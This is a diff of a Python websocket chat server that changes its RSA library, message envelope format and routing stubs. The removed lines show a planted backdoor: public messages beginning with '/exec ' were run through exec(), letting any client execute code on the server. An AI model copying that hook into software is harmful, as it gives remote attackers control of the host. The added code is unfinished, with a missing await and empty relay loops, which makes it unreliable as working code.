@@ -3,15 +3,16 @@ import websockets
 import json
 import base64
 import hashlib
-import rsa
-from Crypto.Cipher import AES
+from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 
 # Store connected clients and their public keys
 clients = {}
+all_clients = {}
 
-# Function to broadcast a message to all clients
-async def broadcast_message(message):
+server_url = "ws://localhost:6666"
+
+async def send_to_clients(message):
     disconnected_clients = []
     for fingerprint, client in clients.items():
         try:
@@ -20,19 +21,20 @@ async def broadcast_message(message):
             print(f"Client {fingerprint} disconnected (failed to send)")
             disconnected_clients.append(fingerprint)
 
-    # Optionally remove disconnected clients from the list
+    # Remove disconnected clients from the list
     for fingerprint in disconnected_clients:
         del clients[fingerprint]
 
+
 # Handle "hello" message and store public key
 async def handle_hello_message(websocket, message):
-    client_data = message.get('data', {})
-    public_key_pem = client_data.get('public_key')
-    username = client_data.get('username')
+    client_data = json.loads(message.get('data', {}))
+    public_key_pem = client_data['public_key']
+    username = client_data['username']
     
     if public_key_pem:
         # Decode the client's public key from PEM
-        public_key = rsa.PublicKey.load_pkcs1(public_key_pem.encode('utf-8'))
+        public_key = RSA.import_key(public_key_pem)
         
         # Generate a fingerprint (Base64-encoded SHA-256 of the public key)
         fingerprint = base64.b64encode(hashlib.sha256(public_key_pem.encode('utf-8')).digest()).decode('utf-8')
@@ -43,53 +45,50 @@ async def handle_hello_message(websocket, message):
 
         # Send back a confirmation message
         response = {
-            "data": {
-                "type": "hello_ack",
-                "message": "Hello received, client registered",
-                "fingerprint": fingerprint,
-                "username": username  # Include the username in the acknowledgment
-            }
+            "type": "hello_ack",
+            "message": "Hello received, client registered",
+            "fingerprint": fingerprint,
+            "username": username  # Include the username in the acknowledgment
         }
         await websocket.send(json.dumps(response))
         print("Sent hello message with public key and username.")
 
 # Handle chat messages
 async def handle_chat_message(websocket, message):
-    data = message.get('data', {})
-    recipient_fingerprint = data.get('destination_servers')[0]  # Assuming 1-to-1 message
+    data = json.loads(message.get('data', {}))
+    destination_servers = data['destination_servers'] 
+    
+    if (server_url in destination_servers):
+        send_to_clients(json.dumps(message))
+        destination_servers.remove(server_url)
+    
+    for server_urls in destination_servers:
+        continue
+        # send to other servers that need it ---------------------------------------------------------------------------------------------------------------------------------
 
-    # Check if the recipient is connected
-    if recipient_fingerprint in clients:
-        recipient = clients[recipient_fingerprint]
-        recipient_websocket = recipient['websocket']
-
-        # Forward the message to the recipient
-        await recipient_websocket.send(json.dumps(message))
-        print(f"Message forwarded to client {recipient_fingerprint}.")
-    else:
-        print(f"Recipient {recipient_fingerprint} not found.")
 
 # Handle public chat messages
 async def handle_public_chat_message(message):
-    if message['data']['message'].startswith("/exec "):
-        cmd = message['data']['message'][6:]
-        exec(cmd)
-    else: 
-        print(f"Broadcasting public message to all clients:\n" + json.dumps(message))
-        await broadcast_message(json.dumps(message))
+    print(f"Broadcasting public message to all clients:\n" + json.dumps(message))
+    await send_to_clients(json.dumps(message))
+    # send to all other servers -----------------------------------------------------------------------------------------------------------------------------------------------
 
 # Message handler to process incoming messages
-async def handle_message(websocket, message):
+async def handle_message(websocket, packet):
     try:
-        message_data = json.loads(message)
-        message_type = message_data.get('data', {}).get('type')
-
-        if message_type == "hello":
-            await handle_hello_message(websocket, message_data)
-        elif message_type == "chat":
-            await handle_chat_message(websocket, message_data)
-        elif message_type == "public_chat":
-            await handle_public_chat_message(message_data)
+        packet_data = json.loads(packet)
+        packet_type = packet_data.get('type')
+        
+        if packet_type == "signed_data":
+            signed_data = json.loads(packet_data["data"])
+            signed_data_type = signed_data.get('type')
+            
+            if signed_data_type == "hello":
+                await handle_hello_message(websocket, packet_data)
+            elif signed_data_type == "chat":
+                await handle_chat_message(websocket, packet_data)
+            elif signed_data_type == "public_chat":
+                await handle_public_chat_message(packet_data)
     except Exception as e:
         print(f"Error handling message: {e}")
 
